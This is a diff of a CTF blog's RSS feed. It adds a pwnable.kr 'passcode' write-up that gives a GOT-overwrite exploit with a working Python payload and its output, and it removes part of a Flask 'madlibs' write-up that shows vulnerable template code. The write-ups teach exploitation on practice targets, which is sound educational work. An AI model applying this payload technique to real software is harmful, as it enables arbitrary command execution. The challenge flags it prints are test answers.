+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;enter passcode1 : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;// ha! mommy told me that 32bit is vulnerable to bruteforcing :)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;enter passcode2 : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;While looking at this part I’ve noticed a possiblity. As we can control what’s inside the the &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode1&lt;/code&gt; variable, and the scanf() function that is supposed to write the value into the location at address presentend by the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode1&lt;/code&gt; variable, we are able to write some value into the any address in the binary. If you don’t understand, let’s break it down into simple steps.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We are able to enter the value into the &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode1&lt;/code&gt; by filling the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; buffer.&lt;/li&gt;
+  &lt;li&gt;Function &lt;code class=&quot;highlighter-rouge&quot;&gt;scanf()&lt;/code&gt; will place the value from &lt;code class=&quot;highlighter-rouge&quot;&gt;stdin&lt;/code&gt; into the location of memory represented by the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;Profit.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;But now we have to find a suitable target for this technique. Here comes this very interesting exploit that will overwrite the GOT table of this binary. What is GOT?&lt;/p&gt;
+
+&lt;p&gt;Global Offset Table is a place in which binary stores the addresses of functions, that are unknown at compilation time and is updated at runtime by dynamic linker. Basically, functions like &lt;code class=&quot;highlighter-rouge&quot;&gt;printf()&lt;/code&gt; have their addresses there because they are not static. That’s why dynamic linker will at runtime look for these addresses of these functions, and put them in GOT. If function is used once again, we only have to get the address from the GOT, no need to run dynamic linker twice.&lt;/p&gt;
+
+&lt;p&gt;For more information I encourage you to read these papers, as this is only droplet in the ocean of knowledge:
+&lt;a href=&quot;https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html&quot;&gt;https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html&lt;/a&gt;
+&lt;a href=&quot;www.infosecwriters.com/text_resources/pdf/GOT_Hijack.pdf&quot;&gt;www.infosecwriters.com/text_resources/pdf/GOT_Hijack.pdf&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we can write down our full plan for attack. Firstly, we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;fflush()&lt;/code&gt; function as our victim that we can overwrite. Function that will be overwriting will be &lt;code class=&quot;highlighter-rouge&quot;&gt;system(&quot;/bin/cat flag&quot;);&lt;/code&gt;. So we have to find addresses of both of them. Then we will pass to the &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode1&lt;/code&gt; address of the &lt;code class=&quot;highlighter-rouge&quot;&gt;fflush()&lt;/code&gt; function, by simply fullfilling the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; buffer. After that using the first &lt;code class=&quot;highlighter-rouge&quot;&gt;scanf()&lt;/code&gt; we will be ready to overwrite the &lt;code class=&quot;highlighter-rouge&quot;&gt;fflush()&lt;/code&gt; function with &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt;. After that all should be ready.&lt;/p&gt;
+
+&lt;p&gt;But firstly, let’s find the address of the &lt;code class=&quot;highlighter-rouge&quot;&gt;fflush()&lt;/code&gt;, what we can do with &lt;code class=&quot;highlighter-rouge&quot;&gt;objudmp -R&lt;/code&gt; command.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;-R
+--dynamic-reloc
+Print the dynamic relocation entries of the file.  This is only
+meaningful for dynamic objects, such as certain types of shared
+libraries.  As for -r, if used with -d or -D, the relocations are
+printed interspersed with the disassembly.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;passcode@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; passcode
+passcode:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE 
+08049ff0 R_386_GLOB_DAT    __gmon_start__
+0804a02c R_386_COPY        stdin@@GLIBC_2.0
+0804a000 R_386_JUMP_SLOT   &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;@GLIBC_2.0
+0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0
+0804a008 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.4
+0804a00c R_386_JUMP_SLOT   puts@GLIBC_2.0
+0804a010 R_386_JUMP_SLOT   system@GLIBC_2.0
+0804a014 R_386_JUMP_SLOT   __gmon_start__
+0804a018 R_386_JUMP_SLOT   &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;@GLIBC_2.0
+0804a01c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
+0804a020 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;See? Here we have it &lt;code class=&quot;highlighter-rouge&quot;&gt;0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Now from the previous disassembly, we cavn view the address of the &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; function.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-assembly&quot; data-lang=&quot;assembly&quot;&gt;   0x080485e3 &amp;lt;+127&amp;gt;:	mov    DWORD PTR [esp],0x80487af
+   0x080485ea &amp;lt;+134&amp;gt;:	call   0x8048460 &amp;lt;system@plt&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And we’re ready to craft the payload - 96 ‘A’ letters, address of the &lt;code class=&quot;highlighter-rouge&quot;&gt;fflush()&lt;/code&gt; function and to satisfy the &lt;code class=&quot;highlighter-rouge&quot;&gt;scanf()&lt;/code&gt; - address of the &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; function.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;passcode@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;print('A' * 96 + '&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;08' + '134514147')&quot;&lt;/span&gt; | ./passcode
+Toddler&lt;span class=&quot;s1&quot;&gt;'s Secure Login System 1.0 beta.
+enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�!
+Sorry mom.. I got confused about scanf usage :(
+enter passcode1 : Now I can safely trust you that you have credential :)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+</description>
+        <pubDate>Fri, 29 Jun 2018 02:00:00 +0200</pubDate>
+        <link>http://localhost:4000/pwnable.kr-passcode/</link>
+        <guid isPermaLink="true">http://localhost:4000/pwnable.kr-passcode/</guid>
+      </item>
+    
+      <item>
         <title>Vulnhub.com - JIS-CTF</title>
         <description>&lt;p&gt;Today we’re going to work on a challenge from Vulnhub called &lt;strong&gt;&lt;em&gt;JIS-CTF&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
 
@@ -568,7 +874,9 @@ Connection: close
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;{&quot;date&quot;: 1527622270.298562, &quot;difficulty&quot;: 4, &quot;hash&quot;: &quot;00008b0833e08517be5dbc1fd645d188e747f8bd4fd170e6dead6696b7e10008&quot;, &quot;nonce&quot;: 38925, &quot;previusHash&quot;: &quot;000021492e9b9b756122db048705babd4cb3e3098a6afb1d33b9d842864d1939&quot;, &quot;transactions&quot;: [[&quot;g&quot;, &quot;b&quot;, 10], [&quot;minedReward&quot;, &quot;g&quot;, 100000000]]}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;And here’s the flag &lt;code class=&quot;highlighter-rouge&quot;&gt;RSCTF_{F1RST_MILLION$$_U_H$VE_TO_STEAL}&lt;/code&gt;!&lt;/p&gt;
+&lt;p&gt;And here’s the flag!&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;RSCTF_{F1RST_MILLION$$_U_H$VE_TO_STEAL}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 </description>
         <pubDate>Sun, 03 Jun 2018 02:00:00 +0200</pubDate>
         <link>http://localhost:4000/blockchain-challenge/</link>
@@ -1453,133 +1761,6 @@ A flag: actf{fruity}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
         <pubDate>Fri, 23 Mar 2018 03:00:00 +0100</pubDate>
         <link>http://localhost:4000/angstromctf-slots/</link>
         <guid isPermaLink="true">http://localhost:4000/angstromctf-slots/</guid>
-      </item>
-    
-      <item>
-        <title>AngstromCTF - madlibs</title>
-        <description>&lt;p&gt;Welcome to first write up from the Angstrom CTF, in which we’re going to focus on web security.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Category: Web&lt;/li&gt;
-  &lt;li&gt;Points: 120&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;When Ian was a kid, he loved to play goofy Madlibs all day long. Now, he's decided to write his own website to generate them!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
-
-&lt;p&gt;We’re presented with the website generating Madlibs stories, getting them from the user input. If you don’t know what Madlibs is take a look &lt;a href=&quot;https://en.wikipedia.org/wiki/Mad_Libs&quot;&gt;here&lt;/a&gt;, but it won’t be needed in order to solve the challenge.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Angstrom MadLibs&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
-
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
-
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;h4&amp;gt;&lt;/span&gt;The Tale of a Person&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h4&amp;gt;&lt;/span&gt;
-
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;
-A long, long time ago, there lived a in person. This person had a prized possesion, it was a my.
-Every day before using their my, the person liked to closet.
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
-
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;h4&amp;gt;&lt;/span&gt;THE END&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h4&amp;gt;&lt;/span&gt;
-
-This MadLib with title The Tale of a Person was created by hello at 2018-03-21 19:48:06
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Click here to return to the home page.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;
-MadLib generated using program found &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;../get-source&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;here&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;As you can see, together with the interface we get a source code of this application, which is written in &lt;a href=&quot;http://flask.pocoo.org/&quot;&gt;Flask&lt;/a&gt;.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;flask&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Flask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;render_template_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;send_from_directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;jinja2&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Environment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FileSystemLoader&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gmtime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strftime&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;template_dir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'./templates'&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;env&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Environment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FileSystemLoader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;template_dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-
-
-&lt;span class=&quot;n&quot;&gt;madlib_names&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;The Tale of a Person&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A Random Story&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;story_fields&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;&quot;The Tale of a Person&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Author Name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Adjective'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Noun'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Verb'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;&quot;A Random Story&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Author Name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Adjective'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Noun'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Any first name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Verb'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Flask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret_key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;flag.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-&lt;span class=&quot;nd&quot;&gt;@app.route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;methods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;home&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;home.html&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;madlib_names&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;nd&quot;&gt;@app.route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/form/&amp;lt;templatename&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;methods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;madlib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;templatename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;madlib_names&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;templatename&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;madlib_names&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;  
-        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;home.html&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;madlib_names&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;templatename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fields&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;story_fields&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;templatename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;error_message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'The MadLib with title &quot;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;templatename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&quot; could not be found.'&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;home.html&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;madlib_names&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;error_message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;nd&quot;&gt;@app.route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/result/&amp;lt;templatename&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;methods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;POST&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;templatename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;templatename&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;madlib_names&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;    
-        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Template not found.&quot;&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;inpValues&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
